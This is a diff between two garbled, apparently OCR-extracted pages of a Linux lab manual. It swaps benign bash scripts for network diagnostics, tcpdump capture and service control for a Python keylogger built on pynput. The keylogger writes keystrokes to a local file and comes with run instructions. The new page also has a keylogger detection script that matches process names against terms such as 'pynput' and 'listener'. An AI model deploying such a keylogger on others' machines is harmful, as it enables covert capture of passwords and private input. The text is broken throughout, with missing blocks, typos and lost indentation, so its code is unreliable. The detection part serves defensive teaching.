@@ -1,86 +1,73 @@
-#!/bin/bash
+from pynput import keyboard
 
-echo " Network Troubleshooting Report="
+# Log file to store keystrokes
 
-echo -e "\n[1] Checking IP address and network interfaces:" ip addr show
+log_file = "keylog_output.txt"
 
-echo -e "\n[2] Default gateway:" ip route | grep default
+def on_press(key):
 
-echo -e "\n[3] DNS resolution test:" nslookup google.com
+except AttributeError:
 
-echo -e "\n[4] Checking connectivity to external server:" ping -c 4 8.8.8.8
+with open(log file, "a") as file: ile.write(f" {key.char}")
 
-echo -e "\n[5] Traceroute to google.com:" traceroute google.com
+with open(log_file, "a") as file: file.write(f"[{key}]")
 
-echo -e "\n[6] Display current connections and listening ports:"
+# Start keylogger
 
-netstat -tulnp
+with keyboard.Listener(on_press=on_press) as listener: listener.join(
 
-echo -e "\n[7] Display routing table:"
+Instructions
 
-netstat -rn
+Install required package:
 
-echo -e "\nNetwork diagnostics
+pip install pynput
 
+Run the script:
 
+python keylogger.py
 
-# Interface and duration as optional arguments
+2.
 
-INTERFACE=${1:-eth0}
+3.
 
-DURATION=$ {2:-30}
+4.
 
-OUTPUT_FILE="capture_$(date +%Y%m%d_%H%M%S).pcap"
+5. Keystrokes s are are saved to keylog_output.txt.
 
-echo "Capturing packets on SINTERFACE for $DURATION seconds..." sudo timeout "$DURATION" tepdump -i "$INTERFACE" -w "$OUTPUT_FILE"
+PART b) Python Keylogger Detection Tool
 
-echo "Capture complete. File saved as SOUTPUT FILE"
+File: detect_keylogger.py
 
+import psutil
 
+# List of suspicious terms commonly used in keylogger scripts
 
-#!/bin/bash
-
-# Usage: ./service control.sh <service> <action> # Example: ./service_control.sh apache2 restart
-
-SERVICE=$1 ACTION=$2
-
-if [[ -z "$SERVICE" || -z "$ACTION" ]]; then echo "Usage: $0 <service> <start|stop|restart>" exit 1
-
-fi
-
-if systemctl list-units --type=service | grep -q "$SERVICE"; then sudo systemctl "$ACTION" "SSERVICE" echo "$SERVICE has been $ACTIONed."
-
-else
-
-fi
-
-echo "Service '$SERVICE' not found.
-
-
-
-
-
-
-#!/bin/bash
-
-# List of services to monitor SERVICES=("apache2" "nginx" "mysql")
-
-for service in "${SERVICES[@]}"; do if systemctl is-active --quiet "Sservice"; then echo "$service is running."
+suspicious terms = ["keylogger", "pynput", "keyboard", "hook", "listener"]
 
 PCCSL308 shell scripting and
 
 network administration using Linux lab
 
-39
+47
 
 Department of Computer Science, MITS Varikoli
 
-else
+found False
 
-echo "ALERT: $service is not running. Restarting..."
+for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
 
-sudo systemctl restart "Sservice"
+mdline =''.join(proc.info['cmdline']).lower()
 
-echo "$service has been restarted."
+if any(term in cmdline for term in suspicious_terms):
 
-done
+print(f"[ ALERT] Suspicious process found: {proc.info}")
+
+found = True
+
+except (psutil.NoSuchProcess, psutil. AccessDenied, psutil.ZombieProcess):
+
+continue
+
+if not found:
+
+print(" No suspicious keylogger-like processes detected.")
